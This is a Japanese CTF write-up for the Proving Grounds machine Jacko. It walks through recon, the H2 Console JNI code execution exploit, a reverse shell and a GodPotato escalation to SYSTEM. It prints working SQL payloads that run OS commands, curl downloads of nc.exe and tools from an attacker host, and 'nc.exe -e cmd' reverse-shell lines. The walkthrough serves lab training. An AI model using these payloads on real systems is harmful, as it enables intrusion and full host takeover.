+++
title = "Proving Grounds Practice - Jacko Writeup"
date = "2026-10-17"
description = "H2 Database ConsoleのJNI Code Execution脆弱性を利用して初期アクセスを獲得し、SeImpersonatePrivilegeとGodPotatoを悪用してNT AUTHORITY\\SYSTEMを取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Jacko]", "[H2 Database]", "[JNI Code Execution]", "[Exploit-DB]", "[SeImpersonatePrivilege]", "[GodPotato]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Jacko |
| OS | Windows |
| Target IP | 192.168.178.66 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全ポートスキャンとデフォルトスクリプト・バージョン検出を実行する。

```bash
nmap -sC -sV -p- 192.168.178.66
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  tcpwrapped
8082/tcp  open  http          H2 database http console
9092/tcp  open  XmlIpcRegSvc?
49664-49669/tcp open msrpc    Microsoft Windows RPC
```

ポート80は`H2 Database Engine`のページへリダイレクトされ、ポート8082では`H2 Console`が稼働していることが確認できた。

H2 Databaseは組み込み型のJavaデータベースであり、管理コンソールを通じてSQLを実行できる機能を持つ。このコンソールを中心に調査を進める。

---

## Enumeration

### Exploit-DB / SearchSploit Research

`H2 database`に関連する既知の脆弱性を調査する。

```bash
searchsploit H2 database
```

```text
H2 Database - 'Alias' Arbitrary Code Execution       | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution          | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure         | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution             | java/local/49384.txt
```

今回はポート8082で稼働するH2 Consoleから直接SQLを実行できる状況であったため、[Exploit-DB 49384](https://www.exploit-db.com/exploits/49384)に記載されているJNI Code Executionの手法を利用する。

```bash
cat 49384.txt
```

このエクスプロイトは、H2 Consoleに用意されている`JNIScriptEngine_eval`関数を利用し、SQL経由で任意のJavaコード(ひいてはOSコマンド)を実行させる手法である。

---

## Exploitation

### H2 Console JNI Code Execution

H2 ConsoleのSQL実行画面から、以下のペイロードで動作確認を行う。

```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("systeminfo").getInputStream()).useDelimiter("\\Z").next()');
```

コマンドの実行結果が返却され、任意コマンド実行が可能であることを確認した。この時点でのOS側の実行ユーザーは`jacko\tony`であった。

### Reverse Shell

攻撃者側でnc.exeを配信し、対象ホストからダウンロード・実行させることでリバースシェルを取得する。

```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl.exe -o C:\Users\Public\nc.exe http://192.168.45.169:80/nc.exe").getInputStream()).useDelimiter("\\Z").next()');
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\Public\\nc.exe -e cmd 192.168.45.169 4444").getInputStream()).useDelimiter("\\Z").next()');
```

攻撃者側で接続を待ち受けたところ、対象ホストからの接続が確立した。

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.178.66] 49988
Microsoft Windows [Version 10.0.18363.836]

C:\Program Files (x86)\H2\service>
```

`H2`サービスの実行コンテキストでコマンドシェルを取得できた。

---

## Privilege Escalation

### winPEAS

winPEASx64を転送・実行する。

```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl.exe -o C:\\Users\\Public\\winPEASx64.exe http://192.168.45.169:80/winPEASx64.exe").getInputStream()).useDelimiter("\\Z").next()');
```

```bash
C:\Users\Public>winPEASx64.exe
```

実行結果から、以下の情報が得られた。

```text
Modifiable Services (T1543.003)
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)

Current Token privileges (T1134.001)
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
```

`whoami /priv`でも同様に`SeImpersonatePrivilege`が有効であることを再確認した。

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`SeImpersonatePrivilege`が有効

### Abusing SeImpersonatePrivilege (GodPotato)

`GodPotato-NET4.exe`を転送する。

```sql
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("curl.exe -o C:\\Users\\Public\\GodPotato-NET4.exe http://192.168.45.169:80/GodPotato-NET4.exe").getInputStream()).useDelimiter("\\Z").next()');
```

動作確認として、まず`whoami`を実行させる。

```powershell
GodPotato-NET4.exe -cmd /c whoami
```

実行ユーザーが`nt authority\system`に昇格していることを確認し、続けてSYSTEM権限でリバースシェルを取得するコマンドを実行する。

```powershell
.\GodPotato-NET4.exe -cmd "nc.exe -e cmd 192.168.45.169 4445"
```

攻撃者側で接続を待ち受ける。

```bash
nc -lvnp 4445
```

```text
listening on [any] 4445 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.178.66] 50189
Microsoft Windows [Version 10.0.18363.836]

C:\Windows\system32>
```

接続後、SYSTEM権限のシェルを取得できたことを確認した。

---

## Summary

ポート8082で稼働していた`H2 Console`に対し、`JNIScriptEngine_eval`を利用したJNI Code Execution(Exploit-DB 49384)により任意コマンド実行を獲得し、`jacko\tony`としてのリバースシェルを取得した。

その後winPEASによる列挙で`SeImpersonatePrivilege`が有効であることを確認し、`GodPotato`を利用してトークンを偽装することで、最終的に`NT AUTHORITY\SYSTEM`の権限を取得した。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービスの列挙
2. ポート8082の`H2 Console`を特定
3. Exploit-DB 49384(JNI Code Execution)の調査・準備
4. `JNIScriptEngine_eval`によるコマンド実行確認
5. nc.exeの転送とリバースシェルの確立(jacko\tony)
6. winPEASによるローカル列挙と`SeImpersonatePrivilege`の確認
7. `GodPotato`によるトークン偽装
8. `NT AUTHORITY\SYSTEM`の取得

今回のポイントは、**管理コンソールが外部から直接SQL/コード実行可能な状態になっていたことを起点に初期アクセスを獲得し、サービスアカウントに付与された`SeImpersonatePrivilege`をPotato系ツールで悪用してSYSTEM権限まで到達したこと**である。
